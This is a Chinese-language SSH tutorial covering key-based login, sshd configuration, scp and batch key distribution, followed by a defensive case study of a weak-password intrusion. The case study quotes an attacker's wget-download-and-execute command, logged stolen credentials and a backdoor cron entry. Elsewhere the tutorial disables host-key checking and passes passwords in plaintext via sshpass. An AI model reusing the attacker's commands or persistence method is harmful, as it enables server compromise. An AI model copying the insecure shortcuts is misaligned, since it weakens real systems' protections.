[TOC]

## 第1章 SSH服务

### 1.1 ssh介绍

> - SSH是Secure Shell Protocol的简写，由IETF网络工作小组（Network Working Group）制定：在进行数据传输之前，SSH先对联机数据包通过加密技术进行加密处理，加密后在进行数据传输。确保了传递的数据安全。
> - SSH是专为远程登录会话和其他网络服务提供的安全性协议。利用SSH协议可以有效的防止远程管理过程中的信息泄露问题，在当前的生产环境运维工作中，绝大多数企业普通采用SSH协议服务来代替传统的不安全的远程联机服务软件，如telnet（23端口，非加密的）等。
> - 在默认状态下，SSH服务主要提供两个服务功能：一个是提供类似telnet远程联机服务器的服务，即上面提到的SSH服务；另一个是类似FTP服务的sftp-server，借助SSH协议来传输数据的，提供更安全的SFTP服务（vsftp.proftp）

**特别提醒**：SSH客户端（ssh命令）还包含一个很有用的远程安全拷贝命令scp，也是通过ssh协议工作的。

![屏幕快照 2017-03-13 下午2.37.42.png-396kB](http://static.zybuluo.com/chensiqi/j02y76vtjsbfc0ntbccb0fh5/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-03-13%20%E4%B8%8B%E5%8D%882.37.42.png)

telnet是不安全的远程连接，连接内容是明文的；
 ssh是加密的远程连接，连接内容是加密的。

### 1.2 知识小结

1）SSH是安全的加密协议，用于远程连接Linux服务器。
 2）SSH默认端口是22，安全协议版本SSH2，除了2之外还有SSH1（有漏洞）.
 3)SSH服务端主要包含两个服务功能SSH远程连接和SFTP服务。
 4）Linux SSH 客户端包含ssh远程连接命令，以及远程拷贝scp命令等。

## 第2章 ssh结构

SSH服务由服务端软件OpenSSH（openssl）和客户端（常见的有SSH），SecureCRT，Putty，xshell组成，SSH服务默认使用22端口提供服务，它有两个不兼容的SSH协议版本，分别是1.x和2.x

下面我们看下服务端上的ssh相关软件。

```
[root@nfs01 data]# rpm -qa | egrep "openss*"
openssh-server-5.3p1-117.el6.x86_64
libreoffice-opensymbol-fonts-4.3.7.2-2.el6.noarch
openssh-5.3p1-117.el6.x86_64
openssh-clients-5.3p1-117.el6.x86_64
openssl-1.0.1e-48.el6.x86_64
openssh-askpass-5.3p1-117.el6.x86_64
```

- OpenSSH同时支持SSH1.x和2.x。用SSH 2.x的客户端程序不能连接到SSH 1.x的服务程序上。
- SSH服务端是一个守护进程（daemon），它在后台运行并响应来自客户端的连接请求。SSH服务端的进程名为sshd，负责实时监听远程SSH客户端的连接请求，并进行处理，一般包括公共密钥认证，密钥交换，对称密钥加密和非安全连接等。这个SSH服务就是我们前面基础系统优化中保留开机自启动的服务之一。
- ssh客户端包含ssh以及像scp（远程拷贝），slogin（远程登录），sftp（安全FTP文件传输）等应用程序。
- ssh的工作机制大致是本地的ssh客户端先发送一个连接请求到远程的ssh服务端，服务端检查连接的客户端发送的数据包和IP地址，如果确认合法，就会发送密钥发回给服务端，自此连接建立。

### 2.1 SSH加密技术

![屏幕快照 2017-03-13 下午3.04.49.png-316.5kB](http://static.zybuluo.com/chensiqi/9zf5iuiwou2uiky3b1nboaya/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-03-13%20%E4%B8%8B%E5%8D%883.04.49.png)

OpenSSH是SSH服务端的软件之一，可同时支持SSH1和SSH2协议，可以在配置文件中使用Protocol指令指定只支持其中一种或两种都支持。
 SSH2同时支持RSA和DSA密钥，但是SSH1仅支持RSA密钥。

**SSH 1.x的加密连接过程：**
 1）当SSH服务启动时，就会产生一个768bit的临时公钥（sshd_config配置文件中 ServerKeyBits 768）存放在Server中。

```
[root@nfs01 data]# grep ServerKey /etc/ssh/sshd_config 
#ServerKeyBits 1024
```

2）当Client端SSH联机请求传送过来时，Server就会将这个768-bit的公钥传给Client端，此时Client会将此公钥与先前存储的公钥进行对比，看是否一致。判断标准是Client端联机用户目录下~/.ssh/known_hosts文件的内容.

```
[root@nfs01 data]# ssh root@backup
The authenticity of host 'backup (172.16.1.41)' can't be established.
RSA key fingerprint is e4:20:6b:ec:b8:16:09:e5:00:5c:52:95:9f:a5:4a:06.
Are you sure you want to continue connecting (yes/no)? 
```

3)当客户端发完以后，Server与Client端在这次的联机中，就以这一对1024-bit的Key pair来进行数据的传递。

**SSH 2.x的加密连接过程**

> - 在SSH 1.x的联机过程中，当Server接受Client端的Private Key后，就不再针对该次联机的Key  pair进行检验。此时若有恶意黑客针对该联机的Key  pair对插入恶意的程序代码时，由于服务端你不会再检验联机的正确性，因此可能会接收该程序代码，从而造成系统被黑掉的问题。
> - 为了改正这个缺点，SSH version 2  多加了一个确认联机正确性的Diffie-Hellman机制，在每次数据传输中，Server都会以该机制检查数据的来源是否正确，这样，可以避免联机过程中被插入恶意程序代码的问题。也就是说，SSH version 2 是比较安全的。
> - 由于SSH1协议本身存在较大安全问题，因此，建议大家尽量都用SSH2的联机模式。而联机版本的设置则需要在SSH主机端与客户端均设置好才行。

## 第3章 ssh服务认证类型

> 从SSH客户端来看，SSH服务主要提供两种级别的安全验证，具体级别如下：

### 3.1 基于口令的安全验证：

基于口令的安全验证的方式就是大家现在一直在用的，只要知道服务器的SSH连接账号和口令（当然也要知道对应服务器的IP及开放的SSH端口，默认为22），就可以通过ssh客户端登录到这台远程主机。此时，联机过程中所有传输的数据都是加密的。

```
[root@nfs01 data]# ssh -p 22 root@backup
root@backup's password:   #要求输入登录密码
Last login: Sat Mar 11 14:00:15 2017 from nfs01
[root@backup ~]# 
```

### 3.2 基于密钥的安全验证：

- 基于密钥的安全验证方式是指，需要依靠密钥，也就是必须事先建立一对密钥对，然后把公用密钥（Public key）放在需要访问的目标服务器上，另外，还需要把私有密钥（Private key）放到SSH的客户端或对应的客户端服务器上。
- 此时，如果要想连接到这个带有公用密钥的SSH服务器，客户端SSH软件或客户端服务器就会向SSH服务器发出请求，请求用联机的用户密钥进行安全验证。SSH服务器收到请求之后，会先在该SSH服务器上连接的用户的家目录下寻找事先放上去的对应用户的公用密钥，然后把它和连接的SSH客户端发送过来的公用密钥进行比较。如果两个密钥一致，SSH服务器就用公用密钥加密“质询”并把它发送给SSH客户端。
- SSH客户端收到“质询”之后就可以用自己的私钥解密，再把它发送给SSH服务器。使用这种方式，需要知道联机用户的密钥文件。与第一种基于口令验证的方式相比，第二种方式不需要在网络上传送口令密码，所以安全性更高了，这时我们也要注意保护我们的密钥文件，特别是私钥文件，一旦被黑客获取，危险就很大了。
- 基于密钥的安全认证也有windows客户端和linux客户端的区别。在这里我们主要介绍的是linux客户端和linux服务端之间的密钥认证。

#### 3.2.1 客户端创建密钥

```
[root@m01 ~]# ssh-keygen 
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa):    #这是让你输入文件名
Enter passphrase (empty for no passphrase):   #这里让你输入密钥对的验证密码（和linux角色密码没有关系）
Enter same passphrase again:      #让你再次输入密码
Your identification has been saved in 
Your public key has been saved in 
The key fingerprint is:
53:76:60:0d:93:2d:12:e2:8e:fa:a0:b0:08:4a:cd:6d root@m01
The key's randomart image is:
+--[ RSA 2048]----+
|      . ..==     |
|     . ...ooo    |
|      .  .o..    |
|     o   o .     |
|    . . S        |
|  o..    .       |
|o.oo E           |
|*o o.            |
|=   .            |
+-----------------+
[root@m01 ~]# ls .ssh/
authorized_keys  id_rsa  id_rsa.pub  known_hosts


#命令说明：
1）创建密钥对时，要你输入的密码，为进行密钥对验证时输入的密码（和linux角色登录的密码完全没有关系）；
2）如果我们要进行的是SSH免密码连接，那么这里密码为空跳过即可。
3）如果在这里你输入了密码，那么进行SSH密钥对匹配连接的时候，就需要输入这个密码了。（此密码为独立密码）
4）用户家目录下的.ssh隐藏目录下会生成：id_rsa  id_rsa.pub  两个文件。id_rsa是用户的私钥；id_rsa.pub则是公钥
```

#### 3.2.2 将公钥id_rsa.pub文件复制到另外一台服务器的用户家目录下的.ssh目录下

```
[root@m01 ~]# ls .ssh/
authorized_keys  id_rsa  id_rsa.pub  known_hosts
[root@m01 ~]# scp ~/.ssh/id_rsa.pub root@172.16.1.31:~/.ssh/
The authenticity of host '172.16.1.31 (172.16.1.31)' can't be established.
RSA key fingerprint is e4:20:6b:ec:b8:16:09:e5:00:5c:52:95:9f:a5:4a:06.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.16.1.31' (RSA) to the list of known hosts.
root@172.16.1.31's password: 
id_rsa.pub                                    100%  390     0.4KB/s   00:00  

提示：
～代表用户的家目录路径
```

#### 3.2.3 将拷贝过去的id_rsa.pub文件里的内容追加到～/.ssh/authorized_keys文件里

```
[root@nfs01 data]# ls ~/.ssh/
authorized_keys  id_rsa.pub  known_hosts
[root@nfs01 data]# cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys 
```

#### 3.2.4 此时我们回到第一台服务器进行远程SSH连接

```
[root@m01 ~]# ssh root@172.16.1.31
Last login: Mon Mar 13 10:45:00 2017 from 172.16.1.1
[root@nfs01 ~]#    #无密码登录成功
```

#### 3.2.5 SSH基于密钥的安全认证总结

1）如果我们要进行免密码的SSH连接，那么在创建密钥对的时候不输入任何密码就可以了。
 2）SSH基于密钥的安全认证的本质其实就是将密钥对中的公钥里的内容拷贝到对方服务器的用户家目录下的.ssh目录里的authorized_keys文件里。
 3）你想要和对方服务器的哪个用户进行密钥对认证，那么你就要把公钥拷到对方该用户的家目录下的.ssh目录里的authorized_keys文件里（如果是想和普通用户进行密钥对登录，需要拷贝到/home目录下的该用户家目录下。）
 4）ssh-keygen -t参数可以指定密钥对的加密类型。如果不指定默认rsa加密

#### 3.2.6 非交互式一条命令创建密钥对

```
[root@m01 ~]# ssh-keygen -t dsa -f ~/.ssh/id_dsa -P ""
Generating public/private dsa key pair.
Your identification has been saved in /root/.ssh/id_dsa.
Your public key has been saved in /root/.ssh/id_dsa.pub.
The key fingerprint is:
5c:02:af:64:9b:83:28:a8:25:ef:57:63:d9:65:b9:6a root@m01
The key's randomart image is:
+--[ DSA 1024]----+
|      .          |
|       o         |
|      o o ..     |
|.  . + = o+      |
|+ o . =oSo .     |
|.=    =.. .      |
|. .  o . .       |
| .  .   E        |
|  ..   .         |
+-----------------+
[root@m01 ~]# ll ~/.ssh/
总用量 24
-rw-------. 1 root root  400 3月  13 14:48 authorized_keys
-rw-------. 1 root root  668 3月  13 17:31 id_dsa
-rw-r--r--. 1 root root  598 3月  13 17:31 id_dsa.pub
-rw-r--r--. 1 root root  786 3月  13 15:26 known_hosts
[root@m01 ~]# 

命令说明：
ssh-keygen:创建密钥对命令
-t：指定加密类型（rsa，dsa）
-f：指定密钥对文件的名字
-P（大写）：指定密码
```

#### 3.2.7 通过ssh-copy-id进行公钥的自动分发。

```
[root@m01 ~]# ssh root@backup
root@backup's password:     #需要输入密码
Last login: Sat Mar 11 15:27:22 2017 from 172.16.1.1
[root@m01 ~]# ls ~/.ssh/    #查看一下本地密钥对
authorized_keys  id_rsa  id_rsa.pub  known_hosts
[root@m01 ~]# ssh-copy-id -i ~/.ssh/id_rsa.pub root@172.16.1.41 #将本地公钥拷贝到172.16.1.41服务器的root目录下
The authenticity of host '172.16.1.41 (172.16.1.41)' can't be established.
RSA key fingerprint is e4:20:6b:ec:b8:16:09:e5:00:5c:52:95:9f:a5:4a:06.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.16.1.41' (RSA) to the list of known hosts.
root@172.16.1.41's password: 
Now try logging into the machine, with "ssh 'root@172.16.1.41'", and check in:

  .ssh/authorized_keys

to make sure we haven't added extra keys that you weren't expecting.

[root@m01 ~]# ssh root@172.16.1.41   #进行免密码ssh登录测试
Last login: Sat Mar 11 15:27:44 2017 from nfs01
[root@backup ~]# 
```

### 3.3 更改ssh默认登录配置

修改SSH服务的运行参数，是通过修改配置文件/etc/ssh/sshd.config文件来实现的。
 一般来说SSH服务使用默认的配置已经能够很好的工作了，如果对安全要求不高，仅仅提供SSH服务的情况，可以不需要修改任何配置。

```
[root@backup ~]# awk '/^#Port/ || /#PermitRoot/||/PermitEmpty/||/UseDNS/||/^GSSAPIAuthentication/{print NR,$0}' /etc/ssh/sshd_config 
13 #Port 22     #ssh连接默认端口22
15 #ListenAddress 0.0.0.0   #设置sshd服务监听的客户端IP地址范围
42 #PermitRootLogin yes   # 是否允许root用户远程登录
65 #PermitEmptyPasswords no  #是否允许空密码
81 GSSAPIAuthentication yes  #
122 #UseDNS yes    #是否使用DNS
```

**提示：**
 1）#号代表注释，去掉#此条命令才算被启用
 2）一旦修改了Port，那么ssh登录时就需要-p指定端口号，不然会登录失败，ssh默认登录22端口
 3）一旦修改了ListenAddress，监听地址，那么不再地址范围内的所有客户端将无法远程连接服务器。
 4）一旦 PermitRootLogin no 被启用，那么root账户将不能够进行ssh远程登录。
 5）一旦启用了PermitEmptyPasswords yes，那么所有无密码的用户也就可以远程登录了，并且还是免密码的方式。
 6）UseDNS no ：建议用no，不需要对DNS进行反向解析，可以加快ssh连接速度。
 7）修改配置文件后，需要重启sshd服务才能生效

### 3.4 远程连接ssh服务

#### 3.4.1 Linux客户端通过ssh连接

ssh基本语法使用

```
SSH -p22 chensiqi@10.0.0.150 [命令]

#SSh连接远程主机命令的基本语法：
# -p（小写） 接端口，默认22端口时可省略-p22
# “@”：前边为用户名，如果用当前用户连接，可以不指定用户名
# “@”：后面为要连接的服务器的IP
```

1，直接登录远程主机的方法：

在未禁止root远程登录及更改SSH端口前的登录方法为：
 `[root@nfs01 ~]# ssh -p22 root@10.0.0.141`

如果端口已修改为特殊端口，那么用上面的命令连接就会发生问题：

```
[root@nfs01 ~]# ssh -p22 root@10.0.0.142
ssh:connect to host 10.0.0.142 port 22:Connection refused  #提示拒绝连接
```

报错字符串对应的可能问题：
 1，no route to host 可能为防火墙影响
 2，Connection refused可能为防火墙
 Connection refused 还可能是连接的对端服务没开或者端口改变了。

#### 3.4.2 SSH客户端命令小结

1，切换到别的机器上ssh -p52113 user@ip（[user@]hostname[command]）

2,到其他机器执行命令（不会切到机器上）ssh -p 52113 user@ip 命令（全路径）

3，当第一次SSH连接的时候，本地会产生一个密钥文件～/.ssh/known_hosts（多个密钥）

### 3.5 ssh客户端附带的远程拷贝scp命令

scp基本语法：scp -secure copy
 每次都是全量拷贝，增量拷贝用rsync

```
推：PUSH
scp -P22 -r -p /tmp/chensiqi root@172.16.1.41:/tmp
拉：PULL
scp -P22 -rp root@172.16.1.41:/tmp/chensiqi /opt/
```

scp为远程拷贝文件或目录的命令

```
-P(大写)：接端口，默认22
-r：递归，表示拷贝目录
-p：表示在拷贝前后保持文件或目录属性
-l limit：限制速度
```

**scp知识小结**
 1，scp是加密的远程拷贝，而cp仅为本地拷贝
 2，可以把数据从一台机器推送到另一台机器，也可以从其他服务器把数据拉回到本地执行命令的服务器
 3，每次都是全量完整拷贝，因此，效率不高，适合第一次拷贝用，如果需要增量拷贝，用rsync

## 第4章 章节重点小结

1，ssh为加密的远程连接协议。相关软件有openssh，openssl
 2，默认端口22
 3，协议版本1.x和2.x，2.x更安全。了解SSH协议原理
 4，ssh客户端包含ssh，scp，sftp命令
 5，ssh安全验证方式：口令和密钥，这两种都是基于口令的，SSH密钥登录的原理。
 6，ssh服务安全优化，修改默认端口22，禁止root远程连接，禁止dns，SSH只监听内网IP
 7，ssh密钥对，公钥在服务器端，比如就是锁头，私钥在客户端。

## 第5章 企业案例：SSH入侵案例

> 通常服务器安全问题在规模较小的公司常常被忽略，没有负责安全的专员，尤其是游戏行业，因为其普遍架构决定了游戏服通常都是内网进行数据交互，一般端口不对外开放，也因此对安全问题不过于重视。接下来要说的，是一次真实的SSH入侵实例，由于运维人员的经验缺乏以及安全意识的薄弱，从而没有及时对已被侵入的服务器做隔离处理，导致扩散到较多的服务器。

**一，事件回顾**

这次的服务器被入侵是一个典型的**弱密码**导致的入侵事件，由于某人员的疏忽，在某台服务器上新建了test用户，且使用同名的弱密码，以便于调试工作所需的脚本工具，就在当天在做脚本调试的时候发现了某些异常的错误，使用root用户无法ssh远程登陆其他服务器，同时scp命令出现异常无法使用，但其他服务器可以使用scp将文件拷贝到该服务器，之后将问题反馈给运维人员，由我们运维进行排查。

**二，排查过程**

收到问题反馈，主要涉及ssh相关的问题后，我们运维对该服务器进行排查，发现使用ssh  -v中的openssl版本无法显示，且输出的帮助信息与其他服务器不一致，然后查看ssh配置，发现配置文件（ssh_config和sshd_config）文件已更新，其内容被全部注释，这时还没有意识到被入侵，悲哀+1，起初以为同事对该服务器做了升级了ssh版本，后来确认无升级之类的操作。

- [x] (1):查看ssh版本及相关信息，openssl的版本显示异常，与其他服务器对比，帮助信息显示方式有多不同

**正常服务器的ssh -v**

```
[root@backup ~]# ssh -v
OpenSSH_5.3p1, OpenSSL 1.0.1e-fips 11 Feb 2013
usage: ssh [-1246AaCfgKkMNnqsTtVvXxYy] [-b bind_address] [-c cipher_spec]
           [-D [bind_address:]port] [-e escape_char] [-F configfile]
           [-I pkcs11] [-i identity_file]
           [-L [bind_address:]port:host:hostport]
           [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port]
           [-R [bind_address:]port:host:hostport] [-S ctl_path]
           [-W host:port] [-w local_tun[:remote_tun]]
           [user@]hostname [command]
```

**有问题服务器的ssh -v**

![屏幕快照 2017-03-13 下午5.58.23.png-1685.9kB](http://static.zybuluo.com/chensiqi/5beg0n5bh7j09ctoemn1u02b/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-03-13%20%E4%B8%8B%E5%8D%885.58.23.png)

- [x] (2):查看ssh进程及其相关文件，ssh和sshd进程文件已更新，ssh_config和sshd_config配置文件已更新，配置文件内容全部注释，ssh_host_key和ssh_host_key.pub为新增文件，其他服务器没有这两个文件。

![屏幕快照 2017-03-13 下午6.04.24.png-1028.2kB](http://static.zybuluo.com/chensiqi/3iv0b2ge8adl7nkhvfneo6kg/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-03-13%20%E4%B8%8B%E5%8D%886.04.24.png)

- [x] (3):继续排查，将一台正确的配置文件覆盖至该服务器，重启ssh服务后，使用ssh命令发现无法识别该配置文件中的参数（到这里其实应该发现ssh进程文件已被篡改，使用md5sum做比对即可）
- [x] (4)：由于其他工作事务需要及时处理，排查这个事情就被搁置了，直至之后的YY讨论问题拿出来询问了下大神，才意识到有被入侵的可能
- [x] (5):询问操作过该服务器的同事，此前正在调试脚本工具，新增了test用户，得知其密码为test
- [x] (6):进行深入排查，使用chkrootkit -q查看Linux系统是否存在后门，发现有异常。协同之前操作test用户的同事，查找history命令记录，发现一条可疑命令

```
$ su - test
$ history
    50 wget http://71.39.255.125/~ake/perf;chmod +x perf; ./perf #非同事操作的可疑命令
$ w  #并且无法查看当前的登录用户
$ cat /usr/include/netda.h  #找到一个用户登录就记录其密码的文件
+user: bin +password:worlddomination
+user: test +password:TF4eygu4@#$ds
```

- [x] (7):在另外一台服务器上，发现某账号家目录下有个dead.letter文件，用于将获取到的信息（系统信息，IP地址，账号密码等）发送至指定的邮箱
- [x] (8)：又在另外一台服务器上部署了一套可疑的程序，估计是作为肉鸡功能

```
$ sudo crontab -e
$ * * * * * /usr/include/statistics/update > /dev/null 2>&1
#原有的cron任务已被清空，仅有该条可疑任务
```

- [x]  (9)：找到/usr/include/statistics为主程序的目录，其中update为主程序，通过autorun脚本进行部署，执行crond伪装成crond服务，使原crond服务隐藏且无法启动，将cron覆盖至原有crontab文件来每分钟执行update二进制程序，mech.pid记录伪装的crond程序的PID

![屏幕快照 2017-03-13 下午6.25.14.png-2479.9kB](http://static.zybuluo.com/chensiqi/wmg4w3mhbpz1ubdzyu7i305p/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-03-13%20%E4%B8%8B%E5%8D%886.25.14.png)

**三，清理工作**

- [x] 紧急修复清理

将准备好的正常的ssh相关文件上传至被入侵服务器的/tmp目录下

1)查看并修改属性

![屏幕快照 2017-03-13 下午9.23.48.png-46.5kB](http://static.zybuluo.com/chensiqi/i454w5yt1ol311t371lappkf/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-03-13%20%E4%B8%8B%E5%8D%889.23.48.png)

2）恢复ssh和sshd

![屏幕快照 2017-03-13 下午9.24.46.png-81.2kB](http://static.zybuluo.com/chensiqi/dcgly0cq2tukoecf67wahfuh/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-03-13%20%E4%B8%8B%E5%8D%889.24.46.png)

3)删除多余的文件以及恢复crond

![屏幕快照 2017-03-13 下午9.24.51.png-38.6kB](http://static.zybuluo.com/chensiqi/kpu0g74twpo4e2o2n3fzsfcq/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-03-13%20%E4%B8%8B%E5%8D%889.24.51.png)

- [x] 后续安全工作

1）修改所有涉及的服务器的账户密码，之后其他使用同类密码的服务器也需改掉

2）配置防火墙策略，只允许公司外网IP可ssh访问服务器

3）对于被入侵过的服务器系统后期逐步重做系统，避免存在未清理的后门

**四，总结**

此次的遭受攻击，问题主要是运维安全意识较差，以及防火墙策略比较松散，为了便于远程工作，像ssh端口未做限制，服务器几乎是裸奔的状态。经过此番折腾，也对服务器安全方面做了一次警示，需加强防御工作，同时也了解到典型的ssh后门功能：其一是超级密码隐身登陆；其二是记录登陆的账号密码。后续还需制定一系列入侵检测机制，以防再次出现入侵事故。

### 5.1 如何防止SSH登录入侵小结：

1，用密钥登录，不用密码登录
 2，防火墙封闭SSH，指定源IP限制（局域网，信任公网）
 3，开启SSH只监听本地内网IP（ListenAddress10.0.0.8）。
 4，尽量不给服务器外网IP

## 第6章 IT公司企业级批量分发管理

1，中小企业最基本实用的SSH HEY密钥的方案（key+expect，脚本+sudo，ssh key（密钥认证）+ ansible）

2，门户网站PUPPET（复杂，太重）
 3，赶集，小米，SALTSTACK批量管理（轻量）

## 6.1 SSH的批量分发管理

**操作系统**

```
[root@m01 ~]# cat /etc/redhat-release 
CentOS release 6.8 (Final)
[root@m01 ~]# uname -r
2.6.32-642.el6.x86_64
```

**主机网络参数**

| 主机名 | 网卡eth0  | 网卡eth1    | 用途           |
| ------ | --------- | ----------- | -------------- |
| m01    | 10.0.0.61 | 172.16.1.61 | 中心批发服务器 |
| nfs01  | 10.0.0.31 | 172.16.1.31 | 接收节点服务器 |
| web01  | 10.0.0.8  | 172.16.1.8  | 接收节点服务器 |
| backup | 10.0.0.41 | 172.16.1.41 | 备份服务器     |

**提示：**
 若无特殊说明，子网掩码均为255.255.255.0，一个C类网段254台机器规模

![屏幕快照 2017-03-14 上午8.49.17.png-338.6kB](http://static.zybuluo.com/chensiqi/fud6x835yrw3vhb01n5429ro/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-03-14%20%E4%B8%8A%E5%8D%888.49.17.png)

### 6.2 需求分析

要求所有服务器在同一用户chensiqi系统用户下，实现A机器从本地分发数据到B，C机器上，发到B，C的过程中不需要系统提示输入密码验证，当然，除了分发的功能，还可以批量查看所有客户机上的CPU，LOAD，MEM，系统版本信息。
 即实现从A服务器发布数据到B，C客户端服务器以及查看信息的免密码登录验证解决方案：分发数据流方向如下：

```repl
A ---->B
A ---->C
A ---->D
```

**具体过程就参考项目实战，这里只介绍分发一台服务器的方法。**

### 6.3 通过sshpass+ssh-kengen+ssh-copy-id进行免交互的SSH密钥批量分发。

**sshpass的安装需要aliyun的epel.repo源**
 `wget -O /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-6.repo`
 `yum -y install sshpass`

#### 6.3.1 尝试进行免交户的ssh连接

我们已经学会面交户生成密钥对了；
 通过sshpass我们还可以进行免交互的登录远程主机；
 但是要想进行批量分发，我们还需要解决一个问题，那就是当第一次进行ssh登录时，都会出现如下信息

```
[root@m01 ~]# ssh root@nfs01
The authenticity of host 'nfs01 (172.16.1.31)' can't be established.
RSA key fingerprint is e4:20:6b:ec:b8:16:09:e5:00:5c:52:95:9f:a5:4a:06.
Are you sure you want to continue connecting (yes/no)? 

说明；
第一次进行远程登录，ssh会试图把远程主机的IP信息存储到～/.known_hosts文件里，所以，会问你yes或no。
```

**yes和no也是交互输入信息的方式，这个我们怎么解决呢？**

```
[root@m01 ~]# ssh -o StrictHostKeyChecking=no root@nfs01    #加入-o那个参数即可解决
Warning: Permanently added 'nfs01,172.16.1.31' (RSA) to the list of known hosts.
root@nfs01's password:
```

**接下来我们可以进行免交户的ssh连接了。**

```
[root@m01 ~]# sshpass -p 登录密码 ssh -o StrictHostKeyChecking=no root@nfs01
Last login: Tue Mar 14 10:48:21 2017 from m01
[root@nfs01 ~]# 

命令说明：
sshpass是免交户输入密码的工具
-p；指定登录密码
-f：给出密码文件路径
```

#### 6.3.2 进行密钥对的免交互式分发。

**第一步：生成密钥对**

```
[root@nfs01 ~]# ssh-keygen -t dsa -P "" -f ~/.ssh/id_dsa
Generating public/private dsa key pair.
Your identification has been saved in /root/.ssh/id_dsa.
Your public key has been saved in /root/.ssh/id_dsa.pub.
The key fingerprint is:
60:55:4f:eb:d4:1b:42:44:06:4e:36:df:3e:eb:32:49 root@nfs01
The key's randomart image is:
+--[ DSA 1024]----+
|        ..*+*    |
|       . + B +   |
|      o   . * +  |
|     . .   o o o |
|        S   . +  |
|            E  o |
|           . ..  |
|            +.   |
|             o.  |
+-----------------+
```

**第二步：免交互分发公钥**

```
[root@m01 ~]# sshpass -p 密码 ssh-copy-id -i ~/.ssh/id_dsa.pub "-o StrictHostKeyChecking=no 172.16.1.31"
Now try logging into the machine, with "ssh '-o StrictHostKeyChecking=no 172.16.1.31'", and check in:

  .ssh/authorized_keys

to make sure we haven't added extra keys that you weren't expecting.

命令说明：
sshpass -p 密码：免交户输入密码
ssh-copy-id -i：指定公钥文件路径
-o StrictHostKeyChecking=no：不记录对方主机信息
```

**第三步：验证公钥发送结果**

```
[root@m01 ~]# ssh root@172.16.1.31  #验证成功
Last login: Tue Mar 14 11:42:28 2017 from m01
[root@nfs01 ~]# 
```